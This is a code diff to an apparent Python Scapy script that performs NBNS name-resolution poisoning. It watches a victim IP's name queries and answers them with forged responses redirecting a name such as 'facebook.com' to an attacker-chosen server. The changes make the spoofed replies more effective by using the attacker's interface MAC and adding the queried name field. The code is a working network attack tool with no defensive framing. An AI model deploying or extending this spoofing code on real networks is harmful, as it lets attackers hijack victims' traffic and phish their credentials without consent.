@@ -15,11 +15,12 @@ def dnsPoisoning(victimIP, url, redirectIP):
     def fakeResponse(pkt, victimIP, url, redirectIP, networkInterface):
         #captore request packet
         if pkt.haslayer(NBNSQueryRequest) and pkt[IP].src == victimIP:
+            pkt.show()
             print("***")
-            etherLayer = Ether(src = pkt[Ether].dst, dst = pkt[Ether].src)
+            etherLayer = Ether(src =get_if_hwaddr(networkInterface), dst = pkt[Ether].src)
             ipLayer = IP(src = pkt[IP].dst, dst = pkt[IP].src)
             udpLayer = UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport)
-            nbnsResponse = NBNSQueryResponse(NAME_TRN_ID = pkt[NBNSQueryRequest].NAME_TRN_ID,
+            nbnsResponse = NBNSQueryResponse(NAME_TRN_ID = pkt[NBNSQueryRequest].NAME_TRN_ID, RR_NAME = pkt[NBNSQueryRequest].QUESTION_NAME,
                                              QDCOUNT=0, ANCOUNT = 1, NSCOUNT = 0,ARCOUNT = 0,  NB_ADDRESS = redirectIP)
             poisonedPaket = etherLayer/ipLayer/udpLayer/nbnsResponse
 
@@ -29,20 +30,4 @@ def dnsPoisoning(victimIP, url, redirectIP):
 
 dnsPoisoning(victimIP, "facebook.com", serverIP)
 
-
-# pkt = sniff(iface=networkInterface, filter="port 137", count = 1)
-# print(pkt)
-#
-# def get_packet_layers(pkt):
-#     counter = 0
-#     while True:
-#         layer = pkt.getlayer(counter)
-#         if layer is None :
-#             return
-#
-#         yield layer
-#         counter += 1
-#
-# for layer in get_packet_layers(pkt):
-#     print(layer.name)
 
